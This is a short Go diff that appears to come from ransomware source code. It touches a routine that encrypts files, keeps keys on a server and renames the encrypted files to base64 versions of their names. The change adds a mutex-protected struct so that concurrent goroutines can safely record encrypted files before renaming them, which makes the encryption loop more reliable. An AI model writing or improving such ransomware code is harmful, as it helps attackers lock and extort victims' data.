@@ -28,8 +28,11 @@ var (
 	// Time to keep trying persist new keys on server
 	SecondsToTimeout = 5.0
 
-	// Create a slice to store the files to rename after encryption
-	FilesToRename []*cryptofs.File
+	// Create a struct to store the files to rename after encryption
+	FilesToRename struct {
+		Files []*cryptofs.File
+		sync.Mutex
+	}
 )
 
 func init() {
@@ -199,7 +202,9 @@ func encryptFiles() {
 					}
 
 					// Schedule the file to rename it later
-					FilesToRename = append(FilesToRename, file)
+					FilesToRename.Lock()
+					FilesToRename.Files = append(FilesToRename.Files, file)
+					FilesToRename.Unlock()
 				}
 			}
 		}()
@@ -209,7 +214,7 @@ func encryptFiles() {
 	wg.Wait()
 
 	// Rename the files after all have been encrypted
-	for _, file := range FilesToRename {
+	for _, file := range FilesToRename.Files {
 		// Replace the file name by the base64 equivalent
 		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
 
